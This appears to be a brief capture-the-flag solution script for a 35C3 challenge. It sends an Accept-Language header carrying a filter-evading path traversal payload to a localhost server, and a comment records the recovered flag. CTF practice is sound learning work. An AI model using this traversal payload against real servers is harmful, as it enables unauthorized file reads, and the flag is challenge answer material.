import requests
import base64

#file = open("getCountry.txt","r")
#lines= file.read().splitlines()

#for line in lines:
    #base64encode = line.encode('ascii')
    #msg = base64.b64encode(base64encode).decode('ascii')
#lol = {'Accept-Language':line+'.jpg'}
r = requests.get("http://localhost:1235", headers={'Accept-Language':'....//....//....//....//flag'})
#    if r.status_code != 404:
#       print(line)
print(r.text)
#35c3_this_flag_is_the_be5t_fl4g
